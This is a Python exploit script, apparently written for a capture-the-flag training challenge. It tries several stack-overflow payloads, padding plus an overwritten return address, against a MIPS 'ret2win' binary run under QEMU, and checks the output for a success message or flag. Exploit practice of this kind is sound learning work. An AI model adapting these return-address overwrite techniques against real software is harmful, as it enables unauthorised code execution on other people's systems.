#!/usr/bin/env python3
import subprocess
import struct

win_addr = 0x400A00
jr_ra = 0x400720

# Different strategies to try
strategies = [
    # 1. Just win address
    (40, struct.pack("<I", win_addr)),
    # 2. win + jr_ra
    (40, struct.pack("<I", win_addr) + struct.pack("<I", jr_ra)),
    # 3. jr_ra + win (stack alignment)
    (40, struct.pack("<I", jr_ra) + struct.pack("<I", win_addr)),
    # 4. Different offsets
    (44, struct.pack("<I", win_addr)),
    (48, struct.pack("<I", win_addr)),
    (52, struct.pack("<I", win_addr)),
    # 5. win + exit (if we can find exit)
    (40, struct.pack("<I", win_addr) + b"\x00" * 4),  # Null as return
]

for i, (offset, suffix) in enumerate(strategies):
    print(f"\n=== Strategy {i+1}: offset={offset} ===")

    # Build payload
    payload = b"A" * offset + suffix

    # Ensure total is 56 bytes (what read() expects)
    if len(payload) < 56:
        payload += b"B" * (56 - len(payload))

    print(f"Payload: {len(payload)} bytes")

    # Run
    proc = subprocess.Popen(
        ["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu", "./ret2win_mipsel"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    stdout, stderr = proc.communicate(payload, timeout=2)

    # Check output
    if b"Well done" in stdout or b"flag" in stdout.lower():
        print("[SUCCESS!]")
        print(stdout.decode())
        break
    else:
        print(f"Output: {stdout.decode()[:50]}...")
        if stderr:
            print(f"Stderr: {stderr.decode()[:50]}...")
